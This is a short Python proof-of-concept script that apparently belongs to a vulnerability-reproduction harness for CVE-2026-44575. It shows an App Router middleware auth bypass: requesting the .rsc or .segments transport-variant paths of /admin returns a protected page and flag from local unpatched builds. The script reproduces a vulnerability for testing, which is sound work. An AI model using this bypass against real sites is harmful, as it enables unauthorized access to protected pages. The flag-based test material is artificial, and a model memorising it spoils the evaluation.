#!/usr/bin/env python3
"""
Original bypass — CVE-2026-44575 (GHSA-267c-6grr-h53f).

App Router serves the middleware-protected /admin page at transport-variant paths
(/admin.rsc and /admin.segments/....segment.rsc). On an unpatched build the
middleware `matcher` compiled from `config.matcher = ["/admin"]` only covers the
human-facing /admin path, so an unauthenticated request to the transport variant
skips the auth gate and the protected page (with ${PCB_FLAG}) is returned.

Profiles (default ports):
  v0     15.2.0  webpack  http://127.0.0.1:41090  -> REACHES  (no fix; matcher lacks .rsc)
  v1_web 15.5.16 webpack  http://127.0.0.1:41091  -> BLOCKED  (CVE-2026-44575 fix; matcher covers .rsc)

Usage: original_poc.py [base_url] [flag]
"""
import sys, os
from oracle import probe

DEFAULT = "http://127.0.0.1:41090"

if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else DEFAULT
    flag = sys.argv[2] if len(sys.argv) > 2 else os.environ.get("PCB_FLAG", "")
    r = probe(base, flag)
    print("control  GET /admin        ->", r["control"]["status"],
          "(enforced_401=%s)" % r["control"]["enforced_401"])
    print("bypass   GET %-16s ->" % r["bypass"]["path"], r["bypass"]["status"],
          "flag_leaked=%s" % r["bypass"]["flag_leaked"])
    print("RESULT:", "BYPASS-REACHES-FLAG" if r["flag_leaked"] else "BLOCKED")
    sys.exit(0 if r["flag_leaked"] else 1)
